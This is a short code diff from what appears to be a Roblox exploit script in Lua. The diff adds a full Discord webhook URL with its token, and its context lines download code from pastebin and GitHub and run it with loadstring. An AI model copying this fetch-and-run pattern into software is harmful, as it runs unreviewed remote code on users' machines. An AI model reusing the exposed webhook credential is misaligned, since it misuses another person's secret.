@@ -23,7 +23,7 @@ local GetService = setmetatable({}, {
 })
 
 local Webhook = loadstring(game:HttpGet("https://pastebin.com/raw/9YZiENVd", true))()
-local debugWebhook = Webhook.new('')
+local debugWebhook = Webhook.new('https://discord.com/api/webhooks/1352050830060032032/hFRmFdIObq-ySnM4hRun45b0Oitq7TKx20I4m4ZzmrEeltFsPidr9k4CZHVz0zCj_tWr')
 
 getgenv().Dependencies = {
 	Notifier = loadstring(game:HttpGet("https://raw.githubusercontent.com/IceMinisterq/Notification-Library/Main/Library.lua"))(),
